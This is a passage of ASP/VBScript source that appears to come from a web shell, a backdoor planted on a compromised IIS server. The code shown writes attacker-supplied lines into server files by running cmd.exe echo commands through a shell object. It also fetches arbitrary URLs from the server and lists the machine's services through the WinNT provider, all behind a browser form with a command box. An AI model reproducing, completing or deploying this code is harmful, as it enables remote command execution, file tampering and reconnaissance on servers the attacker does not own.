curcmdpath=session("cmddrv")&session("cmdpath")
echo curcmdpath

echo "<input type=text id=CMDS name=""fp1"" size=80><br>"&bbf
hfile="http://"&request("HTTP_HOST")&gp(request("URL"))&tfile
echo hfile


echo "<br>"&bbf
echo "<textarea rows=300 cols=106 name=cmdd>"
echo words

echo "</textarea></form>"&bbf


function gp(url)
      gp=url
 while right(gp,1)<>"/"
  gp=left(gp,len(gp)-1)
 wend
end function
function GetHttp(url)
 Set xmlhttp = CreateObject("Msxml2.ServerXMLHTTP") 
 With xmlhttp
 .Open "GET",url,false
 .Send
 GetHttp=.responseBody
 End With
end function
function cmdsave(fname,cmd)
 if cmd="" then exit function
 line=split(cmd,bbf)
 lpfile =session("cmddrv")&session("cmdpath")&fname
 echo lpfile
 e =server.mappath(".")&"\e"
 for i=0 to Ubound(line)
  p=replace(line(i),"^","^^")
  'if left(p,1)=" " then p=":"&mid(p,2)
  'if left(p,1)=chr(9) then p=":"&mid(p,2)
  p=replace(p,"&","^&")
  p=replace(p,"""","^""")
  p=replace(p,"<","^<")
  p=replace(p,">","^>")
  pchar=right(p,1)
  if pchar>="0" and pchar<="9" then p=left(p,len(p)-1)&"^"&pchar
  'p=replace(p,chr(9),"      ")
  if replace(replace(p," ",""),chr(9),"")="" then p=""
  if i=0 and p="" then wsl.Run "cmd.exe /c type "&e&">"&lpfile,0,True
  if i>0 and p="" then wsl.Run "cmd.exe /c type "&e&">>"&lpfile,0,True
  if i=0 and p<>"" then wsl.Run "cmd.exe /c echo "&p&">"&lpfile,0,True
  if i>0 and p<>"" then wsl.Run "cmd.exe /c echo "&p&">>"&lpfile,0,True
 next
end function
Function  BtoS(Binstr)
 skipflag=0
 strC=""
 If Not IsNull(binstr) Then
 lnglen=LenB(binstr)
 For ix=1 To lnglen
 If skipflag=0 Then
 tmpBin=MidB(binstr,ix,1)
 If AscB(tmpBin)>127 Then
 strC=strC&Chr(AscW(MidB(binstr,ix+1,1)&tmpBin))
 skipflag=1
 Else
 strC=strC&Chr(AscB(tmpBin))
 End If
 Else
 skipflag=0
 End If
 Next
 End If
 BtoS  =  strC
End  Function

 

end if
if Session("gl")="listapp" then
echo "<br><span style=""font-size:9pt"">"
on error resume next
'set domainObject = GetObject("WinNT://Domain/Schema")


set domainObject = GetObject("WinNT://.")
for each obj in domainObject
  if lcase(mid(obj.path,4,3))="win" then
  N1=N1&obj.Name&"|"&obj.DisplayName &"<font color=#008000>"&obj.path& "</font><br>"
  else
  N2=N2&obj.Name&"|"&obj.DisplayName &"<font color=#FF0000>"&obj.path& "</font><br>"
  end if
next
set domainObject=nothing
RESPONSE.WRITE N2&N1


echo "</span>"

end if
%>